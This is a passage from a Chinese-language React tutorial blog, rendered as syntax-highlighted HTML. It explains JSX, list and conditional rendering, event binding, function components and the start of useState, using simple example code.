punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-4-渲染流程"><a href="#2-3-4-渲染流程" class="headerlink" title="2.3.4 渲染流程"></a>2.3.4 渲染流程</h3><p>App根组件-&gt;index.js-&gt;public/index.html(root)</p><h1 id="三、JSX基础"><a href="#三、JSX基础" class="headerlink" title="三、JSX基础"></a>三、JSX基础</h1><h2 id="3-1-什么是JSX"><a href="#3-1-什么是JSX" class="headerlink" title="3.1 什么是JSX"></a>3.1 什么是JSX</h2><p>JSX是JavaScript和XMl(HTML)的缩写，表示在JS代码中编写HTML模版结构，它是React中构建UI的方式。</p><p>优势：结合HTML+JS</p><ol><li>HTML的声明式模版写法</li><li>JavaScript的可编程能力</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token string">'this is message'</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is title</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>message<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-JSX的本质"><a href="#3-2-JSX的本质" class="headerlink" title="3.2 JSX的本质"></a>3.2 JSX的本质</h2><p>JSX并不是标准的JS语法，它是 JS的语法扩展，浏览器本身不能识别，需要通过解析工具做解析之后才能在浏览器中使用。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.18.43.png" style="zoom:50%;"><p>Babel在线网站，在线将JSX编译成JS。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.19.06.png" style="zoom:50%;"><h2 id="3-3-JSX高频场景-JS表达式"><a href="#3-3-JSX高频场景-JS表达式" class="headerlink" title="3.3 JSX高频场景-JS表达式"></a>3.3 JSX高频场景-JS表达式</h2><p>在JSX中可以通过 <code>大括号语法{}</code> 识别JavaScript中的表达式，比如常见的变量、函数调用、方法调用等等。</p><ol><li>使用引号传递字符串</li><li>使用JS变量</li><li>函数调用和方法调用</li><li>使用JavaScript对象</li></ol><blockquote><p>注意：if语句、switch语句、变量声明不属于表达式，不能出现在{}中。</p></blockquote><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">//项目的根组件</span><span class="token keyword">function</span> <span class="token function">helloJsx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">"Hello Jsx!"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> count<span class="token operator">=</span><span class="token number">99999</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.        </span><span class="token punctuation">{</span><span class="token comment">/* 使用引号传递字符串 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token string">'This is a String'</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* 使用JS变量 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/*函数调用和方法调用*/</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token function">helloJsx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* 使用JavaScript对象 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token literal-property property">fontSize</span><span class="token operator">:</span><span class="token number">50</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">我变红，变大了吗？</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.35.34.png" alt="截屏2024-12-10 15.35.34"></p><h2 id="3-4-JSX高频场景-列表渲染"><a href="#3-4-JSX高频场景-列表渲染" class="headerlink" title="3.4 JSX高频场景-列表渲染"></a>3.4 JSX高频场景-列表渲染</h2><p>在JSX中可以使用原生js种的<code>map方法</code> 实现列表渲染。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> list <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1001</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'Vue'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1002</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'React'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span><span class="token number">1003</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Angular'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 渲染列表 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* map 循环哪个结构 return结构*/</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 注意事项：加上一个独一无二的key,字符串或者number idt*/</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* key的作用：React框架内部使用 提升更新性能的 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token operator">=&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>js中的箭头函数：</p><p>在JavaScript中，箭头函数（Arrow Function）是ES6（ECMAScript 2015）引入的一种新的函数写法，它提供了一种更简洁的方式来写函数，箭头函数的语法比传统的函数表达式更短，这些函数表达式更适用于那些函数体较短且不需要使用 <code>function</code> 关键字的场景。</p><p>箭头函数的基本语法如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">,</span> paramN</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token comment">// 函数体</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果函数体只有一条语句，可以省略花括号，并且隐式返回该语句的结果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">param1<span class="token punctuation">,</span> param2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">,</span> paramN</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只有一个参数，可以省略参数周围的括号：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token parameter">param</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有参数的函数需要使用一对空括号：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="3-5-条件渲染"><a href="#3-5-条件渲染" class="headerlink" title="3.5 条件渲染"></a>3.5 条件渲染</h2><h3 id="3-5-1-基础条件渲染"><a href="#3-5-1-基础条件渲染" class="headerlink" title="3.5.1 基础条件渲染"></a>3.5.1 基础条件渲染</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token keyword">const</span> loading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>flag <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token punctuation">{</span>loading <span class="token operator">?</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token operator">:</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>一种显示的情况：用&amp;&amp;运算符</p></li><li><p>两种显示的情况：三元运算符</p></li><li><p>三种显示的情况：if else</p></li></ul><h3 id="3-5-2-复杂条件渲染"><a href="#3-5-2-复杂条件渲染" class="headerlink" title="3.5.2 复杂条件渲染"></a>3.5.2 复杂条件渲染</h3><ul><li>需求：列表中需要根据文章的状态适配</li><li>解决方案：自定义函数 + 判断语句</li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> articleType<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">// 0无图 1单图 2双图</span><span class="token keyword">function</span> <span class="token function">getArticleTmpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">无图模式</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">单图模式</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>articleType<span class="token operator">===</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">双图模式</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">"red"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">参数错误！</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token function">getArticleTmpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、React中的事件绑定"><a href="#四、React中的事件绑定" class="headerlink" title="四、React中的事件绑定"></a>四、React中的事件绑定</h1><h2 id="4-1-基础事件绑定"><a href="#4-1-基础事件绑定" class="headerlink" title="4.1  基础事件绑定"></a>4.1  基础事件绑定</h2><p>React中的事件绑定，通过语法 <code>on + 事件名称 = { 事件处理程序 }</code>，整体上遵循驼峰命名法。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">btnClickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"按钮被点击了！"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span><span class="token comment">/* 基础事件绑定 */</span><span class="token punctuation">}</span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hr</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>btnClickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">点我</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text"> //不用传参的情况    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2016.39.47.png" style="zoom:50%;"><h2 id="4-2-使用事件参数"><a href="#4-2-使用事件参数" class="headerlink" title="4.2 使用事件参数"></a>4.2 使用事件参数</h2><p>在事件回调函数中设置形参e即可。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'button按钮点击了'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>事件对象e：</p><p><code>e</code> 是一个参数，它代表事件对象（Event object）。当你在 React 组件中使用 <code>onClick</code> 属性时，浏览器会自动将生成的事件对象作为参数传递给绑定的事件处理函数。</p><p>具体来说，当你点击 <code>&lt;button&gt;</code> 元素时，会触发一个点击事件（<code>click</code> event），浏览器会创建一个事件对象 <code>e</code>，其中包含了关于这个事件的详细信息，比如：</p><ul><li><code>e.type</code>：事件的类型，这里是 <code>"click"</code>。</li><li><code>e.target</code>：触发事件的元素，这里是 <code>&lt;button&gt;</code> 元素。</li><li><code>e.currentTarget</code>：事件绑定的元素，如果事件被冒泡，这里可能与 <code>e.target</code> 不同。</li><li><code>e.preventDefault()</code>：一个方法，用于阻止事件的默认行为。</li><li><code>e.stopPropagation()</code>：一个方法，用于阻止事件继续传播到父元素。</li><li><code>e.clientX</code> 和 <code>e.clientY</code>：鼠标点击时的位置坐标。</li><li>等等。</li></ul></blockquote><h2 id="4-3-传递自定义参数"><a href="#4-3-传递自定义参数" class="headerlink" title="4.3 传递自定义参数"></a>4.3 传递自定义参数</h2><p>语法：事件绑定的位置改造成箭头函数的写法，在执行clickHandler实际处理业务函数的时候传递实参。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2016.46.36.png" style="zoom:35%;"><p>注意：不能直接写函数调用，这里事件绑定需要一个函数引用。</p><h2 id="4-4-同时传递事件对象和自定义参数"><a href="#4-4-同时传递事件对象和自定义参数" class="headerlink" title="4.4 同时传递事件对象和自定义参数"></a>4.4 同时传递事件对象和自定义参数</h2><p>语法：在事件绑定的位置传递事件实参e和自定义参数，clickHandler中声明形参，注意顺序对应。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'button按钮点击了'</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span>e<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token string">'jack'</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、React组件"><a href="#五、React组件" class="headerlink" title="五、React组件"></a>五、React组件</h1><h2 id="5-1-组件是什么"><a href="#5-1-组件是什么" class="headerlink" title="5.1 组件是什么"></a>5.1 组件是什么</h2><p>概念：一个组件就是一个用户界面的一部分，它可以有自己的逻辑和外观，组件之间可以互相嵌套，也可以复用多次。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.13.36.png" style="zoom:40%;"><p>组件化开发可以让开发者像搭积木一样构建一个完整的庞大的应用。</p><h2 id="5-2-组件基础使用"><a href="#5-2-组件基础使用" class="headerlink" title="5.2 组件基础使用"></a>5.2 组件基础使用</h2><p>在React中，一个组件就是<strong>首字母大写的函数</strong>，内部存放了组件的逻辑和视图UI, 渲染组件只需要把组件当成标签书写即可。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 1. 定义组件</span><span class="token keyword">function</span> <span class="token function">Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 内部逻辑</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">click me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token comment">// 可以用箭头函数的方法</span><span class="token comment">// const MyButton2 = ()=&gt;{</span><span class="token comment">//   return &lt;button&gt;Click Me 2&lt;/button&gt;  </span><span class="token comment">// }</span><span class="token comment">// 2. 使用组件</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 自闭和 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Button</span></span><span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 成对标签 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Button</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Button</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="六、useState"><a href="#六、useState" class="headerlink" title="六、useState"></a>六、useState</h1><h2 id="6-1-基础使用"><a href="#6-1-基础使用" class="headerlink" title="6.1 基础使用"></a>6.1 基础使用</h2><p>useState 是一个 React Hook（函数），它允许我们向组件添加一个<code>状态变量</code>, 从而控制影响组件的渲染结果。</p><p>和普通JS变量不同的是，状态变量一旦发生变化组件的视图UI也会跟着变化（数据驱动视图）。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2017.29.45.png" style="zoom:20%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// useState实现一个计数器按钮</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. 调用useState添加一个状态变量</span>  <span class="token comment">// count 状态变量</span>  <span class="token comment">// setCount 修改状态变量的方法</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token 